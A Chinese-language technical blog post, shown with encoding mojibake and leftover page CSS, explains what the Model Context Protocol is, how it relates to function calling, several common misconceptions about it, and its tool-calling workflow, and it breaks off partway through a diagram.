6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2024 å¹´æœ«ï¼ŒMCPï¼ˆModel Context Protocolï¼‰ç«äº†ã€‚å„ç§æŠ€æœ¯æ–‡ç« èœ‚æ‹¥è€Œè‡³ï¼šâ€MCP é©å‘½æ€§çªç ´ï¼â€ã€â€AI å·¥å…·è°ƒç”¨çš„æœªæ¥ï¼â€ã€â€ä¸æ‡‚ MCP å°±outäº†ï¼â€ ä½†å½“ä½ çœŸæ­£å»äº†è§£æ—¶ï¼Œä¼šå‘ç°å¾ˆå¤šæ–‡ç« è¦ä¹ˆæ˜¯æ¦‚å¿µç§‘æ™®ï¼ˆè®²äº†åŠå¤©ä¸çŸ¥é“æ€ä¹ˆç”¨ï¼‰ï¼Œè¦ä¹ˆæ˜¯æ„¿æ™¯æç»˜ï¼ˆå¬èµ·æ¥å¾ˆç¾å¥½ä½†è½ä¸äº†åœ°ï¼‰ã€‚ è¿™ç¯‡æ–‡ç« å°±æ˜¯æ¥ç ´å±€çš„ã€‚ æˆ‘ä»¬ä¸è®²æ•…äº‹ï¼Œåªè®²æœ¬è´¨ï¼šMCP åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå®ƒè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿå’Œ Function Call æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿè¯¥ä¸è¯¥ç”¨ï¼Ÿ</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€MCP åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 ä¸€å¥è¯è¯´æ¸…æ¥š</h3>
<p>MCPï¼ˆModel Context Protocolï¼Œæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰ æ˜¯ä¸€å¥—æ ‡å‡†åŒ–çš„åè®®ï¼Œç”¨æ¥è§„èŒƒ AI åº”ç”¨å¦‚ä½•è°ƒç”¨å¤–éƒ¨å·¥å…·å’Œæ•°æ®æºã€‚</p>
<p>å¬èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Ÿæˆ‘ä»¬æ¢ä¸ªè¯´æ³•ï¼š</p>
<p>æƒ³è±¡ä½ åœ¨å¼€å‘ä¸€ä¸ª AI åŠ©æ‰‹ï¼Œéœ€è¦æ¥å…¥ï¼š</p>
<ul>
<li>åœ°å›¾æœåŠ¡ï¼šæŸ¥åœ°å€ã€è§„åˆ’è·¯çº¿</li>
<li>ï¸ å¤©æ°”æŸ¥è¯¢ï¼šå®æ—¶å¤©æ°”ã€å¤©æ°”é¢„æŠ¥</li>
<li>æ•°æ®åº“ï¼šæŸ¥ç”¨æˆ·æ•°æ®ã€è®¢å•ä¿¡æ¯</li>
<li>é‚®ä»¶æœåŠ¡ï¼šå‘é€é€šçŸ¥</li>
</ul>
<p>æ²¡æœ‰ MCP ä¹‹å‰ï¼šæ¯ä¸ªæœåŠ¡éƒ½æœ‰è‡ªå·±çš„æ¥å£æ ¼å¼</p>
<ul>
<li>A æœåŠ¡ç”¨ JSON-RPC</li>
<li>B æœåŠ¡ç”¨ REST API</li>
<li>C æœåŠ¡ç”¨ gRPC</li>
<li>D æœåŠ¡è¦è‡ªå®šä¹‰åè®®</li>
</ul>
<p>ä½ å¾—åˆ†åˆ«ç ”ç©¶æ¯ä¸ª API æ–‡æ¡£ï¼Œå†™ä¸åŒçš„é€‚é…ä»£ç ï¼Œç»´æŠ¤å¤šå¥—è°ƒç”¨é€»è¾‘ã€‚å›¢é˜Ÿåä½œæ—¶è¿˜è¦åå¤å¯¹é½æ¥å£æ ¼å¼ã€‚</p>
<p>æœ‰äº† MCP ä¹‹åï¼šå¤§å®¶çº¦å®šç»Ÿä¸€çš„â€æ¥å£æ ‡å‡†â€</p>
<ul>
<li>å·¥å…·æä¾›æ–¹æŒ‰ MCP åè®®æš´éœ²èƒ½åŠ›ï¼ˆMCP Serverï¼‰</li>
<li>AI åº”ç”¨æŒ‰ MCP åè®®è°ƒç”¨å·¥å…·ï¼ˆMCP Clientï¼‰</li>
<li>æ ¼å¼ã€è®¤è¯ã€é”™è¯¯å¤„ç†éƒ½æœ‰ç»Ÿä¸€è§„èŒƒ</li>
</ul>
<p>ç±»æ¯”ç†è§£ï¼šMCP ä¹‹äº AI å·¥å…·è°ƒç”¨ï¼Œå°±åƒ USB ä¹‹äºæ•°æ®ä¼ è¾“ã€‚</p>
<ul>
<li>æ²¡æœ‰ USB å‰ï¼šæ¯ä¸ªè®¾å¤‡éƒ½æœ‰è‡ªå·±çš„æ¥å£ï¼ˆå„ç§åœ†å£ã€æ–¹å£ã€æ‰å£ï¼‰ï¼Œä¹±ä¸ƒå…«ç³Ÿ</li>
<li>æœ‰äº† USB åï¼šä¸€ä¸ªæ ‡å‡†èµ°å¤©ä¸‹ï¼Œæ’ä¸Šå°±èƒ½ç”¨</li>
</ul>
<hr/>
<h3 data-id="heading-2">1.2 MCP è§£å†³çš„æ ¸å¿ƒé—®é¢˜</h3>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ªå®é™…åœºæ™¯è¯´æ˜ï¼š</p>
<p>åœºæ™¯ï¼šä½ åœ¨åšä¸€ä¸ªæ™ºèƒ½å®¢æœç³»ç»Ÿï¼Œéœ€è¦ï¼š</p>
<ol>
<li>æŸ¥è¯¢ç”¨æˆ·è®¢å•çŠ¶æ€ï¼ˆè°ƒç”¨å†…éƒ¨è®¢å•ç³»ç»Ÿ APIï¼‰</li>
<li>æŸ¥è¯¢ç‰©æµä¿¡æ¯ï¼ˆè°ƒç”¨é¡ºä¸°/äº¬ä¸œç‰©æµ APIï¼‰</li>
<li>æŸ¥è¯¢å•†å“åº“å­˜ï¼ˆè°ƒç”¨åº“å­˜ç³»ç»Ÿ APIï¼‰</li>
<li>å‘é€å®¢æœæ¶ˆæ¯ï¼ˆè°ƒç”¨ä¼ä¸šå¾®ä¿¡ APIï¼‰</li>
</ol>
<h3 data-id="heading-3">é—®é¢˜ 1ï¼šæ¥å£æ ¼å¼ä¸ç»Ÿä¸€</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d2bfeb7b1a049c18f6faf3a232e0621~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5peF5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765986704&amp;x-signature=Bz50cn766t%2BY0lnydRHLPAvGEpU%3D" alt="image.png" loading="lazy"/></p>
<p>æ¯ä¸ªæ¥å£éƒ½ä¸ä¸€æ ·ï¼Œä½ å¾—å†™å¤§é‡çš„é€‚é…ä»£ç ã€‚</p>
<h3 data-id="heading-4">é—®é¢˜ 2ï¼šAI ä¸çŸ¥é“è¯¥è°ƒç”¨å“ªä¸ªå·¥å…·</h3>
<p>AI æ”¶åˆ°ç”¨æˆ·é—®é¢˜â€æˆ‘çš„è®¢å•ä»€ä¹ˆæ—¶å€™åˆ°ï¼Ÿâ€ï¼Œéœ€è¦åˆ¤æ–­ï¼š</p>
<ul>
<li>è¿™ä¸ªé—®é¢˜éœ€è¦è°ƒç”¨ä»€ä¹ˆå·¥å…·ï¼Ÿ</li>
<li>éœ€è¦å“ªäº›å‚æ•°ï¼Ÿ</li>
<li>å‚æ•°ä»ç”¨æˆ·çš„è¯é‡Œæ€ä¹ˆæå–ï¼Ÿ</li>
</ul>
<p>æ²¡æœ‰ç»Ÿä¸€è§„èŒƒï¼Œæ¯ä¸ªå¼€å‘è€…éƒ½è‡ªå·±å®šä¹‰ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>å·¥å…·æè¿°æ ¼å¼ä¸ä¸€è‡´</li>
<li>å‚æ•°å®šä¹‰æ–¹å¼ä¸ä¸€è‡´</li>
<li>AI éš¾ä»¥å‡†ç¡®åˆ¤æ–­</li>
</ul>
<h3 data-id="heading-5">é—®é¢˜ 3ï¼šå›¢é˜Ÿåä½œå›°éš¾</h3>
<ul>
<li>å‰ç«¯å¼€å‘è€…ï¼šåç«¯æ¥å£æ€ä¹ˆè°ƒï¼Ÿå‚æ•°æ ¼å¼æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>åç«¯å¼€å‘è€…ï¼šAI ä¼šä¼ ä»€ä¹ˆå‚æ•°è¿‡æ¥ï¼Ÿæ€ä¹ˆå¤„ç†ï¼Ÿ</li>
<li>AI å·¥ç¨‹å¸ˆï¼šå·¥å…·åˆ—è¡¨æ€ä¹ˆç»´æŠ¤ï¼Ÿæç¤ºè¯æ€ä¹ˆå†™ï¼Ÿ</li>
</ul>
<p>ç¼ºä¹æ ‡å‡†ï¼Œæ²Ÿé€šæˆæœ¬å·¨å¤§ã€‚</p>
<hr/>
<p>MCP çš„è§£å†³æ–¹æ¡ˆï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c97b1402514a7390289ef29cd32e80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5peF5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765986704&amp;x-signature=APGMhhH8MskiWGGtyhHkWhy%2F%2FPM%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰€æœ‰å·¥å…·éƒ½æŒ‰è¿™ä¸ªæ ¼å¼å®šä¹‰ï¼ŒAI èƒ½ç»Ÿä¸€å¤„ç†ï¼Œå¼€å‘è€…èƒ½å¿«é€Ÿé›†æˆã€‚</p>
<blockquote>
<p>Tipï¼šMCP ä¸æ˜¯é“¶å¼¹ï¼Œå®ƒåªæ˜¯æŠŠâ€è°ƒç”¨å¤–éƒ¨å·¥å…·â€è¿™ä»¶äº‹æ ‡å‡†åŒ–äº†ã€‚åŸæœ‰çš„é—®é¢˜ï¼ˆAI åˆ¤æ–­ä¸å‡†ã€å‚æ•°æå–é”™è¯¯ï¼‰å¹¶æ²¡æœ‰æ¶ˆå¤±ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">1.3 ç ´é™¤ä¸‰ä¸ªå¸¸è§è¯¯è§£</h3>
<h3 data-id="heading-7">è¯¯è§£ 1ï¼šâ€MCP æ˜¯ä¸€ç§æ–°çš„ AI æŠ€æœ¯â€</h3>
<p>å¾ˆå¤šæ–‡ç« ä¼šè¯´â€MCP æå‡äº† AI çš„å·¥å…·è°ƒç”¨èƒ½åŠ›â€ï¼Œè¿™æ˜¯ä¸å‡†ç¡®çš„ã€‚</p>
<p>çœŸç›¸ï¼šMCP åº•å±‚ç”¨çš„è¿˜æ˜¯ä¼ ç»Ÿçš„ Function Callï¼ˆå·¥å…·è°ƒç”¨ï¼‰ã€‚</p>
<p>çœ‹ä¸€æ®µ MCP å®¢æˆ·ç«¯çš„æ ¸å¿ƒä»£ç ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeeb76f52319417380167f28b3e96188~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5peF5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765986704&amp;x-signature=DEM5zdR1viv3BAQg96tJqu3kwJQ%3D" alt="image.png" loading="lazy"/></p>
<p>MCP åªæ˜¯åœ¨ Function Call å¤–é¢åŒ…äº†ä¸€å±‚æ ‡å‡†åŒ–åè®®ï¼Œæ²¡æœ‰æ”¹å˜ AI çš„åˆ¤æ–­èƒ½åŠ›ã€‚</p>
<p>Function Call åŸæœ‰çš„é—®é¢˜ä¾ç„¶å­˜åœ¨ï¼š</p>
<ul>
<li>âŒ å·¥å…·é€‰æ‹©ä¸å‡†ç¡®ï¼ˆå·¥å…·å¤ªå¤šæ—¶å®¹æ˜“é€‰é”™ï¼‰</li>
<li>âŒ å‚æ•°æå–é”™è¯¯ï¼ˆå¤æ‚å‚æ•°å®¹æ˜“æå–ä¸å‡†ï¼‰</li>
<li>âŒ å¤šæ„å›¾è¯†åˆ«å›°éš¾ï¼ˆä¸€ä¸ªé—®é¢˜æ¶‰åŠå¤šä¸ªå·¥å…·ï¼‰</li>
</ul>
<p>ç»“è®ºï¼šMCP æ˜¯åè®®æ ‡å‡†åŒ–ï¼Œä¸æ˜¯æŠ€æœ¯çªç ´ã€‚</p>
<hr/>
<h3 data-id="heading-8">è¯¯è§£ 2ï¼šâ€ç”¨äº† MCP å°±ä¸ç”¨è‡ªå·±å†™å·¥å…·è°ƒç”¨ä»£ç äº†â€</h3>
<p>å¾ˆå¤šäººä»¥ä¸º MCP æ˜¯ä»€ä¹ˆâ€å¼€ç®±å³ç”¨â€çš„è§£å†³æ–¹æ¡ˆï¼Œè£…ä¸Šå°±èƒ½ç”¨ã€‚</p>
<p>çœŸç›¸ï¼šMCP çš„å·¥ä½œæµç¨‹å’Œä½ è‡ªå·±å®ç° Function Call å‡ ä¹ä¸€æ¨¡ä¸€æ ·ã€‚</p>
<p>å¯¹æ¯”ä¸€ä¸‹ï¼š</p>






























<table><thead><tr><th>å®ç°æ­¥éª¤</th><th>è‡ªå·±å†™ Function Call</th><th>ä½¿ç”¨ MCP</th></tr></thead><tbody><tr><td>1ï¸âƒ£ å®šä¹‰å·¥å…·</td><td>å†™å·¥å…·æè¿° + å‚æ•°å®šä¹‰</td><td>MCP Server å®šä¹‰å·¥å…·ï¼ˆè¿˜æ˜¯è¦å†™ï¼‰</td></tr><tr><td>2ï¸âƒ£ AI å†³ç­–</td><td>è°ƒç”¨ AI çš„ Function Call</td><td>MCP Client è°ƒç”¨ AIï¼ˆè¿˜æ˜¯ Function Callï¼‰</td></tr><tr><td>3ï¸âƒ£ æ‰§è¡Œå·¥å…·</td><td>åç«¯æ¥æ”¶å‚æ•°ï¼Œè°ƒç”¨çœŸå® API</td><td>MCP Server æ‰§è¡Œå¹¶è¿”å›ï¼ˆè¿˜æ˜¯è¦å®ç°ï¼‰</td></tr><tr><td>4ï¸âƒ£ ç”Ÿæˆå›å¤</td><td>æŠŠç»“æœç»™ AI ç”Ÿæˆå›å¤</td><td>MCP Client æŠŠç»“æœç»™ AIï¼ˆé€»è¾‘ä¸€æ ·ï¼‰</td></tr></tbody></table>
<p>æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ã€‚</p>
<p>é‚£ MCP çš„ä»·å€¼åœ¨å“ªï¼Ÿç­”æ¡ˆæ˜¯ï¼šç”Ÿæ€æ ‡å‡†åŒ–ã€‚</p>
<p>å½“å¤§å®¶éƒ½æŒ‰åŒä¸€å¥—è§„åˆ™æ¥ï¼š</p>
<ul>
<li>âœ… å·¥å…·èƒ½è·¨é¡¹ç›®å¤ç”¨</li>
<li>âœ… å›¢é˜Ÿåä½œæœ‰ç»Ÿä¸€è§„èŒƒ</li>
<li>âœ… ç¬¬ä¸‰æ–¹å·¥å…·èƒ½æ–¹ä¾¿é›†æˆ</li>
<li>âœ… é™ä½å­¦ä¹ å’Œæ²Ÿé€šæˆæœ¬</li>
</ul>
<p>ä½†å¦‚æœä½ åªæ˜¯ä¸€ä¸ªäººå¼€å‘ï¼Œæˆ–è€…å·¥å…·éƒ½æ˜¯è‡ªå·±çš„å†…éƒ¨ APIï¼ŒMCP çš„ä»·å€¼å°±æ²¡é‚£ä¹ˆå¤§ã€‚</p>
<blockquote>
<p>Tipï¼šæŠŠ MCP ç†è§£æˆâ€å·¥å…·è°ƒç”¨çš„æ¥å£æ ‡å‡†â€ï¼Œå°±åƒ RESTful API æ˜¯ Web æœåŠ¡çš„æ¥å£æ ‡å‡†ä¸€æ ·ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">è¯¯è§£ 3ï¼šâ€MCP æœåŠ¡éƒ½æ˜¯å…è´¹çš„â€</h3>
<p>çœ‹åˆ°å„ç§ MCP Serverï¼ˆé«˜å¾·åœ°å›¾ã€ç™¾åº¦åœ°å›¾ã€å¤©æ°”æœåŠ¡ï¼‰ï¼Œæœ‰äººä»¥ä¸ºè°ƒç”¨æ˜¯å…è´¹çš„ã€‚</p>
<p>çœŸç›¸ï¼šAPI è°ƒç”¨æˆæœ¬æœ€ç»ˆè¿˜æ˜¯è¦æœ‰äººæ‰¿æ‹…ã€‚</p>
<p>ä»¥é«˜å¾·åœ°å›¾ MCP ä¸ºä¾‹ï¼š</p>
<ol>
<li>ä½ é€šè¿‡ Cursor è°ƒç”¨é«˜å¾·åœ°å›¾ MCP</li>
<li>é«˜å¾·çš„ MCP Server æ”¶åˆ°è¯·æ±‚åï¼Œä¼šè°ƒç”¨é«˜å¾·è‡ªå·±çš„åœ°å›¾ API</li>
<li>è¿™äº› API è°ƒç”¨æ˜¯è®¡è´¹çš„ï¼ˆæŒ‰è°ƒç”¨æ¬¡æ•°æˆ–é…é¢ï¼‰</li>
</ol>
<p>æœ‰äº›å¤§å‚çš„ MCP æœåŠ¡æ˜¯å…è´¹çš„ï¼Œä½†é‚£æ˜¯å› ä¸ºï¼š</p>
<ul>
<li>å‰æœŸæŠ•å…¥ï¼Œå¸å¼•å¼€å‘è€…</li>
<li>è°ƒç”¨é‡æœ‰é™åˆ¶ï¼ˆè¶…è¿‡å°±æ”¶è´¹ï¼‰</li>
<li>åŸ¹å…»ç”Ÿæ€ã€è·å–æ•°æ®ã€å é¢†å¸‚åœº</li>
</ul>
<p>å¤©ä¸‹æ²¡æœ‰å…è´¹çš„åˆé¤ï¼Œåªæ˜¯è°ä»˜è´¹ã€æ€ä¹ˆä»˜è´¹çš„é—®é¢˜ã€‚</p>
<p>å¦‚æœä½ ç”¨ MCP æ¥å…¥æ”¶è´¹æœåŠ¡ï¼Œè¦æ³¨æ„ï¼š</p>
<ul>
<li>âš ï¸ äº†è§£è®¡è´¹è§„åˆ™ï¼ˆæŒ‰æ¬¡æ•°ï¼ŸæŒ‰æµé‡ï¼ŸæŒ‰æ—¶é•¿ï¼Ÿï¼‰</li>
<li>âš ï¸ è®¾ç½®è°ƒç”¨é™é¢ï¼ˆé˜²æ­¢æ„å¤–è¶…æ”¯ï¼‰</li>
<li>âš ï¸ ç›‘æ§ä½¿ç”¨é‡ï¼ˆå®šæœŸæ£€æŸ¥è´¦å•ï¼‰</li>
<li>âš ï¸ è€ƒè™‘ç¼“å­˜ç­–ç•¥ï¼ˆå‡å°‘é‡å¤è°ƒç”¨ï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-10">1.4 MCP çš„çœŸæ­£ä»·å€¼ï¼šç”Ÿæ€è¯è¯­æƒ</h3>
<p>æ—¢ç„¶ MCP æ²¡æœ‰æŠ€æœ¯åˆ›æ–°ï¼Œä¸ºä»€ä¹ˆ Anthropicï¼ˆClaude çš„æ¯å…¬å¸ï¼‰è¦å¤§åŠ›æ¨ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼šäº‰å¤º AI å·¥å…·ç”Ÿæ€çš„è¯è¯­æƒã€‚</p>
<h3 data-id="heading-11">ç±»æ¯”ï¼šUSB æ ‡å‡†çš„æ•…äº‹</h3>
<p>è¿˜è®°å¾— USB æ ‡å‡†æ˜¯æ€ä¹ˆæ¥çš„å—ï¼Ÿ</p>
<p>1990 å¹´ä»£ï¼š</p>
<ul>
<li>é”®ç›˜ç”¨ PS/2 æ¥å£</li>
<li>é¼ æ ‡ç”¨ä¸²å£</li>
<li>æ‰“å°æœºç”¨å¹¶å£</li>
<li>æ‰«æä»ªç”¨ SCSI æ¥å£</li>
<li>æ¯ä¸ªè®¾å¤‡éƒ½ä¸ä¸€æ ·ï¼Œä¹±ä¸ƒå…«ç³Ÿ</li>
</ul>
<p>1996 å¹´ï¼š</p>
<ul>
<li>Intelã€å¾®è½¯ã€IBM ç­‰å·¨å¤´è”åˆæ¨å‡º USB æ ‡å‡†</li>
<li>ä¸€ä¸ªæ¥å£ç»Ÿä¸€æ‰€æœ‰è®¾å¤‡</li>
<li>è°åˆ¶å®šæ ‡å‡†ï¼Œè°å°±æŒæ¡è¯è¯­æƒ</li>
</ul>
<p>ä»Šå¤©ï¼š</p>
<ul>
<li>USB æˆä¸ºäº‹å®æ ‡å‡†</li>
<li>USB-IFï¼ˆUSB æ ‡å‡†åŒ–ç»„ç»‡ï¼‰æŒæ¡ç”Ÿæ€æ§åˆ¶æƒ</li>
<li>æ–°æŠ€æœ¯ï¼ˆType-Cã€USB4ï¼‰éƒ½è¦é€šè¿‡ä»–ä»¬è®¤è¯</li>
</ul>
<h3 data-id="heading-12">MCP æƒ³åšçš„å°±æ˜¯ AI é¢†åŸŸçš„ USB</h3>
<p>Anthropic æ¨ MCP çš„çœŸå®æ„å›¾ï¼š</p>
<ol>
<li>åˆ¶å®šè§„åˆ™ï¼šè®©å¤§å®¶æŒ‰è‡ªå·±å®šçš„åè®®å¼€å‘</li>
<li>å é¢†ç”Ÿæ€ï¼šæ‰€æœ‰å·¥å…·æä¾›å•†ã€AI åº”ç”¨éƒ½æ¥å…¥ MCP</li>
<li>è¯è¯­æƒï¼šåœ¨æœªæ¥çš„æ ‡å‡†å§”å‘˜ä¼šä¸­å æ®å…³é”®ä½ç½®</li>
</ol>
<p>å¦‚æœ MCP çœŸçš„æˆä¸ºè¡Œä¸šå…±è¯†ï¼š</p>
<ul>
<li>æ‰€æœ‰æ¨¡å‹çš„å·¥å…·è°ƒç”¨æ ¼å¼å¯èƒ½è¢«ç»Ÿä¸€</li>
<li>Anthropic åœ¨æ ‡å‡†å§”å‘˜ä¼šçš„ä½ç½®ä¸¾è¶³è½»é‡</li>
<li>èƒ½å½±å“æ•´ä¸ª AI å·¥å…·ç”Ÿæ€çš„èµ°å‘</li>
</ul>
<p>å¯¹å¼€å‘è€…æ¥è¯´ï¼ŒMCP çš„ä»·å€¼åœ¨äºï¼š</p>
<ol>
<li>âœ… å¿«é€Ÿæ¥å…¥ç°æˆæœåŠ¡ï¼šä¸ç”¨ç ”ç©¶ API æ–‡æ¡£ï¼Œè£…ä¸ª MCP Server å°±è¡Œ</li>
<li>âœ… å›¢é˜Ÿåä½œè§„èŒƒï¼šç»Ÿä¸€é…ç½®æ ¼å¼ï¼Œæ–¹ä¾¿ç‰ˆæœ¬æ§åˆ¶</li>
<li>âœ… å‚ä¸ç”Ÿæ€å»ºè®¾ï¼šæ—©æœŸå‚ä¸è€…èƒ½å å…ˆæœº</li>
<li>âœ… é™ä½é›†æˆæˆæœ¬ï¼šä¸€æ¬¡å¼€å‘ï¼Œåˆ°å¤„è¿è¡Œ</li>
</ol>
<p>ä½†ä¹Ÿè¦è®¤æ¸…ï¼š</p>
<ul>
<li>âš ï¸ MCP è¿˜åœ¨æ—©æœŸï¼Œè§„èŒƒå¯èƒ½å˜åŒ–</li>
<li>âš ï¸ ç”Ÿæ€ä¸å¤Ÿæˆç†Ÿï¼Œå¯ç”¨å·¥å…·æœ‰é™</li>
<li>âš ï¸ ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½é€‚åˆç”¨ MCP</li>
<li>âš ï¸ æ ¸å¿ƒä¸šåŠ¡é€»è¾‘å»ºè®®è‡ªå·±æŒæ§</li>
</ul>
<hr/>
<h2 data-id="heading-13">äºŒã€MCP çš„å·¥ä½œåŸç†</h2>
<p>ç†è§£äº† MCP æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬æ¥çœ‹å®ƒå…·ä½“æ˜¯æ€ä¹ˆå·¥ä½œçš„ã€‚</p>
<h3 data-id="heading-14">2.1 æ ¸å¿ƒå·¥ä½œæµç¨‹</h3>
<p>MCP çš„å·¥ä½œæµç¨‹åˆ†ä¸ºä¸‰æ­¥ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå®é™…ä¾‹å­è¯´æ˜ï¼š</p>
<p>åœºæ™¯ï¼šç”¨æˆ·åœ¨ Cursor ä¸­é—® AIï¼šâ€åŒ—äº¬å¤©å®‰é—¨çš„ç»çº¬åº¦æ˜¯å¤šå°‘ï¼Ÿâ€</p>
<pre><code class="hljs language-ini" lang="ini">ç¬¬ 1 æ­¥ï¼šç”¨æˆ·æé—®
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç”¨æˆ·:              â”‚
â”‚   åŒ—äº¬å¤©å®‰é—¨çš„ç»çº¬     â”‚
â”‚   åº¦æ˜¯å¤šå°‘ï¼Ÿ          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â€‹
ç¬¬ 2 æ­¥ï¼šMCP å®¢æˆ·ç«¯è¯¢é—® AI
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MCP å®¢æˆ·ç«¯          â”‚
â”‚  (Cursor)           â”‚
â”‚                      â”‚
â”‚  æŠŠé—®é¢˜å’Œå¯ç”¨å·¥å…·    â”‚
â”‚  åˆ—è¡¨å‘ç»™ AIï¼š       â”‚
â”‚  - åœ°ç†ç¼–ç å·¥å…·      â”‚
â”‚  - è·¯å¾„è§„åˆ’å·¥å…·      â”‚
â”‚  - å¤©æ°”æŸ¥è¯¢å·¥å…·      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â€‹
ç¬¬ 3 æ­¥ï¼šAI å†³ç­–
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  AI æ¨¡å‹              â”‚
â”‚  (GPT-4/Claude)      â”‚
â”‚                      â”‚
â”‚  åˆ†æåå†³å®šï¼š          â”‚
â”‚  âœ“ ä½¿ç”¨ã€Œåœ°ç†ç¼–ç ã€å·¥å…· â”‚
â”‚  âœ“ å‚æ•°ï¼š             â”‚
â”‚    <span class="hljs-attr">address</span>=          â”‚
â”‚    åŒ—äº¬å¤©å®‰é—¨          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â€‹
ç¬¬ 4 æ­¥ï¼šMCP æœåŠ¡ç«¯æ‰§è¡Œ
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MCP æœåŠ¡ç«¯          â”‚
â”‚  (é«˜å¾·åœ°å›¾ API)     â”‚
â”‚                      â”‚
â”‚  æ”¶åˆ°è¯·æ±‚åï¼š        â”‚
â”‚  1. è°ƒç”¨é«˜å¾·åœ°å›¾API  â”‚
